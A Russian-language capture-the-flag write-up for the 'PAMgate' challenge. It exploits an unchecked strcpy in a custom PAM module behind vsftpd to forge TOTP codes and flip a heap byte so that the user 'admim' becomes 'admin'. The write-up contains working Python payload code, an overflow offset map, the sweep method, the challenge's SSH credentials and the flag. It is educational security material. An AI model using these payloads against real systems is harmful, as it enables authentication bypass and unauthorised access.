# PAMgate — райтап

**Флаг:** `avito{3a5Y_4DMIN_1NCREmeNt}`
**Класс:** Linux / PAM OOB byte-flip (data-only) · **Сложность:** неизвестно · **Очки:** неизвестно · **Решило команд:** неизвестно
**Автор:** неизвестно

**Суть решения в одном абзаце.** Кастомный PAM-модуль `pam_pamgate.so`, которым vsftpd проверяет
FTP-логины, копирует пароль в 10-байтный стековый буфер через `strcpy` без канарейки и без
ограничения длины — это работает под root, ещё до chroot'а vsftpd. Переполнение даёт три
независимых примитива: подделку TOTP, неограниченный OOB-инкремент байта в куче (`g[idx]++`) и
полноценный контроль RIP. Самый громкий из них — RIP — оказался доказанным тупиком: регистры
диспетчера `libpam` в момент перехвата закрывают весь класс one-gadget'ов. Победил куда более
тихий примитив: зарегистрировать легальное имя `admim` (blocklist запрещает только `admin`) и
точным попаданием OOB-инкремента превратить пятый байт живой строки `PAM_USER` (`'m'` → `'n'`) —
vsftpd перечитывает эту строку сразу после `pam_authenticate()`, поэтому chroot уезжает в
`/srv/ftp/admin`, откуда в той же FTP-сессии читается `flag.txt`.

---

## 1. Задача

Легенда (`task.md`): в «Бюро пропусков» нашли забытый служебный леток — пчёлы обмениваются
накладными по старому FTP, а к шлюзу прикрутили PAM и одноразовые коды; каждый вход попадает в
«журнал посещений». За проходной — закрытая администраторская сота с маршрутами караванов.

**Доступ:** SSH `pamgate@pamgate-6kvkwh54.avitoctf.ru` (пароль `nsbq2wQfOjg8DXRAYGmRcw`). Внутри —
урезанный PTY-шелл под непривилегированным `player` (uid 1002), из которого доступен `vsftpd` на
`127.0.0.1:30029`.

**Цель:** прочитать `/srv/ftp/admin/flag.txt`. Файл `0444`, но лежит в каталоге `0550
root:ftpvirt`. FTP-сессии выполняются от системного пользователя `ftpvirt` (он состоит в группе
`ftpvirt`, значит каталог `r-x`-доступен), но **жёстко chroot'ятся** в `/srv/ftp/$USER`. То есть
прочитать флаг сможет только сессия, у которой `$USER == admin` — тогда `local_root` станет
`/srv/ftp/admin`. `player` в группу `ftpvirt` не входит, и напрямую (`cat` по SSH) флаг не читает.

## 2. Разведка

Из world-readable `Dockerfile`/`/entrypoint.sh` на самой машине (`RE_NOTES.md`, `ESCAPE_NOTES.md`):

- `ubuntu:24.04`, `libc6=2.39-0ubuntu8.7`, `libpam-modules=1.5.3-5ubuntu5.5`,
  `vsftpd=3.0.5-0ubuntu3.1` — сток, без патчей.
- `/etc/vsftpd.conf`: `guest_enable=YES`, `guest_username=ftpvirt`, `user_sub_token=$USER`,
  `local_root=/srv/ftp/$USER`, `chroot_local_user=YES`, `allow_writeable_chroot=NO`,
  `write_enable=NO`, `pam_service_name=pamgate`, `listen_port=30029`. Каждый виртуальный
  пользователь маппится в одну ОС-учётку `ftpvirt` и chroot'ится в `/srv/ftp/<логин>`.
- Userstore `/run/pamgate/users` при старте засеян **только** строкой `guest:0:NBSWY3DPEHPK3PXQ`.
  `admin` в userstore отсутствует и не может быть заведён обычным способом (блок-лист, см. ниже).
- `sshd` модуль `pam_pamgate` не использует — он работает только для FTP-аутентификации
  (`/etc/pam.d/pamgate`: `auth required pam_pamgate.so`, остальные фазы — `pam_permit`/`pam_deny`).

Реверсом `pam_pamgate.so` (radare2/objdump, `RE_NOTES.md`) восстановлен весь `pam_sm_authenticate`
(`0x195e`–`0x1ba1`). Модуль вызывается PAM'ом **до** того, как vsftpd сбросит привилегии и сделает
chroot, то есть исполняется **под root**. Логика:

```
pam_get_user(&user)                     ; var_10h = указатель на строку PAM_USER
get_authtok(&pw)                        ; пароль (FTP-команда PASS)
journal_init()                          ; g = calloc(256), если ещё не создан (.bss @0x5138)
found = userstore_lookup(user,&rec)     ; rec = {name, index, secret}, лежит на СТЕКЕ (rbp-0x50)
if (!found) {                           ; --- ветка ENROLL ---
    if (pw != "enroll") return PAM_AUTH_ERR
    validate_name(user)                 ; charset [A-Za-z0-9_-], len 1..32, блок-лист {admin,guest}
    userstore_create(user,&rec2)        ; секрет = RAND_bytes(16) -> base32
    ensure_home(user); write_totp(...); write_stats(user,0)
    return PAM_SUCCESS
}
/* --- ветка AUTH (пользователь существует) --- */
memset(buf/*rbp-0x5a, 10 байт*/, 0, 10)
jidx = rec.index                        ; 16-битный «журнальный индекс»
strcpy(buf, pw)                         ; <<< БЕЗ КАНАРЕЙКИ, БЕЗ ОГРАНИЧЕНИЯ ДЛИНЫ
if (!otp_verify(buf, rec.secret)) return PAM_AUTH_ERR   ; atoi(pw) == TOTP(rec.secret, now)
p = g + (int16)jidx
*p = *p + 1                             ; <<< OOB read-modify-write: g[idx]++
write_stats(user, (uint8)*p)            ; в /srv/ftp/<user>/stats.txt пишется "logins: N"
return PAM_SUCCESS
```

Зафиксировано как факт: в структуре `rec` нет ничего похожего на `is_admin`/uid/группу — «админ»
это просто предзаведённое имя `admin`, под которым vsftpd chroot'ит сессию в `/srv/ftp/admin`.
Прямой путь закрыт двумя барьерами (подтверждено live): `USER admin` → `530` (нет в userstore,
lookup промахивается ещё до OTP), и зарегистрировать `admin` нельзя — `validate_name` держит
блок-лист `{admin,guest}` и charset `[A-Za-z0-9_-]` (без `/` и `.`, traversal-имя тоже не завести).

## 3. Как мы вышли на решение (логика гипотез)

1. **Наблюдение.** Единственная нестандартная поверхность — кастомный `pam_pamgate.so`; всё
   остальное (vsftpd, PAM-конфиг) — сток. **Гипотеза:** баг именно в этом модуле. **Проверка:**
   реверс дал canary-less `strcpy(buf@rbp-0x5a, PASS)` в 10-байтный буфер, исполняемый под root —
   реальный, эксплуатируемый overflow с точной байтовой картой полей кадра.

2. **Тупик №1 (быстрый).** Первая мысль — просто залогиниться/зарегистрироваться как `admin`.
   Проверка: `USER admin` → `530` (не в userstore); попытка `enroll` под именем `admin` — блок-лист
   `validate_name`. Оба барьера закрыты независимо от overflow. Прямой путь исключён.

3. **Гипотеза (сработала частично).** Раз `[46:62]` пароля перезаписывает `rec.secret` **до**
   сравнения `atoi(pw)==TOTP(rec.secret,now)`, можно подделать TOTP для **любого существующего**
   пользователя, подставив свой секрет. Проверка подтвердила: логин под `guest`/самозарегистри-
   рованным именем с собственным секретом проходит. Но это **не продвигает к `admin`** — `admin`
   не существует в userstore, `lookup` промахивается раньше самой OTP-проверки. Дыра реальна, но
   бесполезна для цели напрямую.

4. **Самый громкий примитив — RIP.** Байты `[98:106]` перезаписывают адрес возврата: NUL-
   terminated `strcpy` останавливается только на `0x00`, значит контролируем ровно 6 байт адреса
   (без цепочки, один прыжок). **Гипотеза (интуитивно самая очевидная): «есть RIP — значит есть
   RCE» → получить root-шелл → прочитать флаг напрямую.** На неё ушло больше всего усилий
   (несколько параллельных «lane»-агентов, счёт живых попыток на сотни).
   - Утечка базы libc через отдельный оракул: значение `g[idx]` эхом уходит в счётчик `logins:` в
     `stats.txt`, поэтому heap-байт рядом с известным libc-указателем читается побайтово; формула
     `libc_base = qword@(g+0x25a8) − 0x204220` перепроверена 3 независимыми прогонами.
   - Перебрали все 17 кандидатов из `one_gadget -l2 libc.so.6`, часть отстреляна вживую (350+
     попыток суммарно по нескольким lane) — **ноль новых процессов**.
   - **Почему это тупик — доказано, а не «не повезло».** Дизассемблирование диспетчера
     `libpam.so.0` (функции, которая делает `dlsym`-вызов `pam_sm_authenticate`) зафиксировало
     регистры в момент перехвата: `RAX=7`, `RBX=1` (`handler->type`, из собственного `cmp eax,1`
     диспетчера) всегда. А NUL-terminated `strcpy` не даёт записать канонический указатель в
     сохранённый RBP (старшие байты обнулятся раньше, чем дойдёт очередь до RIP). Это убивает **всё**
     семейство `execve`-one-gadget'ов (нужен writable `rbp-0x48/-0x50`) и всё семейство
     `posix_spawn` (нужен `(u16)[rbx]==0`, а `rbx` доказанно `==1`) — поимённо, для каждого из 17
     гаджетов. Это редкий случай именно **доказанного** отрицательного результата, а не «кончились
     попытки».

5. **Тупик №2, параллельно исследованный вариант того же RIP-примитива.** Попробовали частичную
   перезапись адреса возврата так, чтобы попасть не в libc, а внутрь самого `libpam.so.0` (там же
   есть classic-PLT таблица). Нашли теоретически валидную посадку на `write@PLT`, но подтверждённого
   живого срабатывания в рамках сессии добиться не удалось — направление закрыто как непродуктивное.

6. **Гипотеза (data-only, не RIP).** Байты `[74:82]` перезаписывают сохранённый указатель
   `var_10h` (тот самый `PAM_USER`), который использует **root**-код `write_stats`/`write_userfile`
   и для имени файла, и для содержимого. **Идея:** направить этот указатель на свою строку и
   получить произвольную запись от имени root. **Проверка:** механизм подтверждён вживую —
   немаппированная цель роняет процесс (`500 OOPS`), а свежий валидный libc-адрес даёт чистый
   `530` без падения. **Почему всё равно тупик, три независимые причины:** (а) чтобы указать на
   свою `../`-строку, нужен **адрес стека**, а оракул `g[idx]` читает только кучу — стек и куча
   рандомизируются независимо (подтверждено сравнением с `/proc/pid/maps` живого `vsftpd`); (б) имя
   файла всё равно жёстко зашито (`stats.txt`/`totp.txt`), `fopen` только в режиме `"w"` — обратного
   чтения через этот путь в модуле нет вообще; (в) chroot сессии vsftpd решает по сырому `USER` **до**
   запуска PAM, так что даже гипотетически удавшаяся запись читаться нашей же сессией не будет.

7. **Переосмысление.** После того как несколько «сделать запись полезной» идей закрылись именно на
   **цели** записи (недостижимый адрес / нечитаемый результат), встал другой вопрос: какие данные
   **уже лежат** в достижимом окне `±32 КБ` кучи, куда бьёт `g[idx]++`, без всякой утечки адреса?
   Заметили: `PAM_USER` — обычная C-строка, живущая в той же куче форкнутого child'а, что и
   `g = calloc(256)` внутри модуля. И ключевое наблюдение по блок-листу: `validate_name` проверяет
   имя **только в момент регистрации** — про то, как выглядит имя сессии **после** аутентификации,
   в модуле вообще ничего не сказано.

8. **Рабочая гипотеза.** Зарегистрировать легальное имя, отличающееся от `admin` ровно на один
   инкрементируемый байт, а `g[idx]++` направить не «куда попало» (не в поисках function
   pointer/vtable, как пробовали раньше), а точно в этот байт **уже существующей** строки
   `PAM_USER`, уже **после** успешной OTP-проверки. `admim` подходит идеально: `'m'` (0x6d) `+1` =
   `'n'` (0x6e) = `admin`, и charset/блок-лист `validate_name` его пропускают.

9. **Проверка условия «успеет ли»**. Дизассемблированием живого `vsftpd` подтвердили: он вызывает
   `pam_get_item(pamh, PAM_USER, &buf)` **сразу после** `pam_authenticate()`, то есть перечитывает
   строку уже после того, как в ней успел сработать инкремент. Если к этому моменту строка равна
   `admin` — chroot пойдёт в `/srv/ftp/admin`.

10. **Подбор индекса, а не формула.** Точный сдвиг между `g` и `PAM_USER[4]` аналитически не
    выводится — он зависит от цепочки аллокаций OpenSSL при HMAC-SHA1 внутри проверки TOTP и от
    раскладки кучи конкретного форкнутого child'а. Пошли на **выровненный live-перебор**:
    гипотеза «нужный байт лежит по остатку 4 от 16-байтного выравнивания malloc-чанка» →
    перебор `idx` в `[-0x2000, -0x6C0)` с фильтром `idx & 0xF == 4`.

11. **Ближний промах (не тупик, а неточность гипотезы).** Первые кандидаты `-0x55c` и `-0x4fc`
    успешно логинились, но `stats.txt` всё ещё показывал `user: admim` — инкремент прилетел
    куда-то рядом, но не в целевой байт. Продолжили расширенный sweep в том же выровненном окне.

12. **Хит.** `idx = -6940` (wire little-endian `e4 e4`) → `stats.txt` показал `user: admin`.

13. **Методологическая ловушка (реально записана как ложный тупик в `STATUS.md`: «admim→admin
    OOB-write username flip: TESTED, does NOT change chroot»).** Отдельное переподключение с уже
    известным `idx=-6940` иногда не воспроизводило флип. Причина, найденная только после разбора:
    раскладка кучи у каждого форкнутого child'а своя, поэтому **фиксированный индекс из одного
    соединения не гарантированно переносится на новое**. Из-за этого раньше сделали неверный
    вывод «флип не влияет на chroot», хотя на самом деле просто не совпал per-connection heap
    layout.

14. **Исправленная методика.** Не разносить «нашли хит» и «прочитали флаг» по разным соединениям:
    sweep должен проверять `stats.txt` и, как только видит `user: admin`, **сразу же, в той же FTP-
    сессии**, делать `RETR flag.txt` — до того, как соединение закроется и heap-раскладка
    следующего child'а снова станет случайной. Именно такой одношаговый sweep и вернул флаг.

## 4. Уязвимость

`pam_sm_authenticate` в ветке AUTH делает `strcpy` пароля (аргумент FTP-команды `PASS`) в
10-байтный буфер на стеке (`buf@rbp-0x5a`) без канарейки и без ограничения длины. `strcpy`
останавливается только на `0x00`; FTP-транспорт дополнительно запрещает `0x0a`/`0x0d` в аргументе.
Карта переполнения (смещения байта пароля):

| смещение пароля | во что попадает | смысл |
|---|---|---|
| `[0:k]` | `buf[0..]` | ASCII OTP-кода (его читает `atoi`) |
| `[7:9]` | `var_53h` | 16-битный **знаковый** журнальный индекс |
| `[46:62]` | `rec.secret` | инъекция base32-секрета **до** OTP-проверки |
| `[74:82]` | `var_10h` | сохранённый указатель на `PAM_USER` |
| `[90:98]` | saved RBP | |
| `[98:106]` | return address | классический stack smash |

Из этой карты — три независимых примитива (подделка TOTP, `g[idx]++` без проверки границ, control
RIP), но эксплуатируемым до флага оказался только второй: **неограниченный OOB-инкремент байта в
куче**, `g = calloc(256)` в `.bss`-глобале модуля, индекс не проверяется по диапазону `0..255` —
запись `+1` возможна в окне `±32 КБ` от базы `g`, включая чужие, легитимно выделенные объекты той
же кучи (в частности — строку `PAM_USER`, которую vsftpd перечитывает после `pam_authenticate()`).
Дополнительный логический баг: `validate_name` проверяет блок-лист `{admin,guest}` только в момент
регистрации и ничего не знает про итоговое состояние `PAM_USER` после аутентификации.

## 5. Эксплойт по шагам

Все шаги выполняются на самой машине (SSH-харнесс) против `127.0.0.1:30029`, сырыми FTP-байтами
(`ftplib` с `encoding="latin-1"`; в payload нет `0x00`, `0x0a`, `0x0d`).

1. **Собрать payload логина под известным TOTP-секретом.**

   ```python
   SECRET = b"AAAAAAAAAAAAAAAA"       # секрет, который сами же и инъецируем

   def otp():
       d = hmac.new(base64.b32decode(SECRET), struct.pack(">Q", int(time.time() // 30)),
                    hashlib.sha1).digest()
       o = d[-1] & 0x0F
       return f"{(int.from_bytes(d[o:o+4], 'big') & 0x7fffffff) % 1000000:06d}".encode()

   def password(idx):
       p = bytearray(b"P" * 62)
       p[:6]    = otp()                  # [0:6]  TOTP-код для нашего секрета
       p[6]     = ord("X")               # [6]    нецифровой байт: atoi() останавливается здесь
       p[7:9]   = struct.pack("<h", idx) # [7:9]  знаковый int16 журнальный индекс
       p[46:62] = SECRET                 # [46:62] замена rec.secret -> OTP пройдёт
       return bytes(p).decode("latin-1")
   ```

2. **Зарегистрировать `admim`** (легально, `admin` в блок-листе, `admim` — нет):

   ```python
   f = ftplib.FTP(); f.encoding = "latin-1"; f.connect("127.0.0.1", 30029, timeout=10)
   f.login("admim", "enroll")     # USER admim / PASS enroll -> "230 Login successful."
   ```

3. **Перебрать выровненные индексы** `idx & 0xF == 4` в диапазоне `[-0x2000, -0x6C0)`, логинясь
   под `admim` с `password(idx)` из шага 1.

4. **В той же сессии** сразу после логина прочитать `stats.txt` (`RETR stats.txt`) и проверить
   маркер `user: admin`.

5. **Не закрывая соединение**, если маркер найден — тут же `RETR flag.txt`:

   ```python
   out["login"] = f.login("admim", pw)
   f.retrbinary("RETR stats.txt", buf.write)
   if out["user"] == "admin":
       flag = io.BytesIO()
       f.retrbinary("RETR flag.txt", flag.write)     # тот же child, тот же heap layout
       out["flag"] = flag.getvalue().decode()
   ```

Рабочий прогон нашёл `idx = -6940` (`e4e4` на проводе) и сразу же в той же сессии вернул флаг.
Полный воспроизводимый скрипт — `task20/agents/username_flip_reopen/offset_sweep.py` (см. §8).

## 6. Флаг

Живой ответ сервера в выигрышной сессии (`agents/username_flip_reopen/raw/flag_hit.txt`):

```
ENROLL 230 Login successful.
HIT {"idx": -6940, "idx_hex": "e4e4", "login": "230 Login successful.",
     "logins": 110, "stats": "user: admin\nlogins: 110\n",
     "user": "admin", "flag": "avito{3a5Y_4DMIN_1NCREmeNt}\n"}
```

`logins: 110` — независимое подтверждение механизма: `110 = 0x6e = ASCII 'n'`, это тот же самый
инкрементированный байт, который превратил `'m'` в `'n'`; модуль читает его повторно для
`write_stats` и репортит как «число посещений».

## 7. Выводы

1. **Класс уязвимости.** Canary-less `strcpy` в root-контексте — это не «один баг», а генератор
   независимых примитивов (auth bypass через инъекцию секрета, OOB heap write через
   неваlidированный индекс, control-RIP через переполнение до адреса возврата). Не каждый из них
   стоит эскалировать до RCE: здесь самый громкий (RIP) был доказанно закрыт, а победил самый
   «служебный» на вид (`g[idx]++`, задуманный как счётчик визитов).
2. **Защита.** Проверки allowlist/blocklist должны действовать на протяжении всего жизненного
   цикла идентичности, а не только в момент регистрации; модуль, который переписывает `PAM_USER`,
   не должен доверяться повторно без валидации после любых мутаций в том же процессе. Массивы,
   индексируемые значением из недоверенного ввода (`g[idx]++`), обязаны проверять границы, даже
   если индекс кажется «внутренним счётчиком».
3. **Методология.** Доказанная стена (регистровые ограничения диспетчера `libpam`, а не просто
   серия неудач) — сигнал пересмотреть, какие ещё данные достижимы тем же примитивом, а не
   наращивать сложность гаджета. Находки от heap-оракула нужно валидировать **в той же сессии**:
   раскладка кучи меняется от коннекта к коннекту, и разнесение «нашли смещение» и «воспользовались
   им» по разным подключениям даёт ложноотрицательный результат (как и произошло здесь один раз).
